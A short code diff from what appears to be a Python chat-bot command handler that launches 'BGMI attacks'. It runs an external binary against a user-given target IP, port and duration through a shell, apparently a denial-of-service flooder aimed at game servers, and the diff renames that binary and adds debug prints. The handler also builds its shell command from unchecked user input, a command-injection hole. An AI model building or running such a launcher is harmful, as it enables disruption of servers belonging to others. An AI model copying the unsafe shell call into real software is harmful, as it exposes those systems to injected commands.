@@ -443,8 +443,10 @@ def handle_bgmi(message):
                 start_attack_reply(
                     message, target, port, time
                 )  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 100"
+                full_command = f"./m {target} {port} {time} 100"
+                print(f"Executing command: {full_command}")  # Debug line
                 process = subprocess.run(full_command, shell=True)
+                print(f"Process return code: {process.returncode}")  # Debug line
                 response = (
                     f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 )
